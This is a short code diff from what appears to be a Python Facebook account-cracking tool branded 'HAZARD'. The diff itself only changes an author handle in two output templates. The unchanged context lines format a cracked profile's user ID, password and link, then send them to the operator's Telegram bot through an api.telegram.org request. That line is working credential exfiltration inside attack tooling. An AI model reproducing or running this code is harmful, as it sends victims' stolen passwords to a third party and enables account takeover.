@@ -983,7 +983,7 @@ class Main:
 ❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}
 
 ⋘─────━𓆩𝐇𝐀𝐙𝐀𝐑𝐃𓆪─────━⋙ 
-BY~@Hazard2  —  Bot~@H_7_Wbot
+BY~@H_7_Z_W  —  Bot~@H_7_Wbot
 𝐋𝐈𝐍𝐊 : https://www.facebook.com/profile.php?id={uid}&mibextid=ZbWKwL
 ''')
 				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
@@ -1421,7 +1421,7 @@ BY~@Hazard2  —  Bot~@H_7_Wbot
 ❖ - 𝐏𝐀𝐒𝐒𝐖𝐑𝐃 : {pw}
 
 ⋘─────━𓆩𝐇𝐀𝐙𝐀𝐑𝐃𓆪─────━⋙ 
-BY~@Hazard2  —  Bot~@H_7_Wbot
+BY~@H_7_Z_W  —  Bot~@H_7_Wbot
 𝐋𝐈𝐍𝐊 : https://www.facebook.com/profile.php?id={uid}&mibextid=ZbWKwL
 ''')
 				requests.get("https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(tlg))
